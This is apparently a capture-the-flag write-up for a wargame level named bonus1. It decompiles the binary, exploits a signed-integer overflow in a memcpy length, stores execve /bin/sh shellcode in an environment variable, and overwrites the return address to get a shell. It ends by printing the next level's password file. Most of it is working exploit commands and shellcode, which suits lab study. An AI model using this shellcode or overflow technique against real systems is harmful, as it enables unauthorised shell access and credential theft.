get the binary on host
* scp -P 4242 bonus1@192.168.56.107:./bonus1 ./binary/bonus1

decompile using ghidras
```c
int main(int param_1, undefined4 param_2)
{
	int uVar1;
	undefined local_3c [40];
	int local_14;
	
	local_14 = atoi(*(undefined4 *)(param_2 + 4));
	if (local_14 < 10) {
		memcpy(local_3c,*(undefined4 *)(param_2 + 8),local_14 * 4);
		if (local_14 == 1 464 814 662) {
		execl("/bin/sh","sh",0);
		}
		uVar1 = 0;
	}
	else {
		uVar1 = 1;
	}
	return uVar1;
}
```
unsigned int max = 4294967296\
4294967296 / 4  = 1073741824 => memcpy 0;

let's use our global shellcode again\
`export SHELLCODE=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")`

`/tmp/get_env SHELLCODE`\
got `0xbffff82e`


build the payload $(python -c "print 'a' * OFFSET + '\x2e\xf8\xff\xbf'")\
len to cpy is -(1073741824 - 'PRINT_LEN'/4);
* -(1073741824 - (OFFSET + 4) / 4)
* -(1073741823 - OFFSET/4)

It's dichotomy time !
* OFFSET == 56

So the len is `-(1073741823 - 56/4)` = `-(1073741823 - 14)` = `-1073741809`

./bonus1 -1073741809 $(python -c "print 'a' * 56 + '\x2e\xf8\xff\xbf'")
```
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```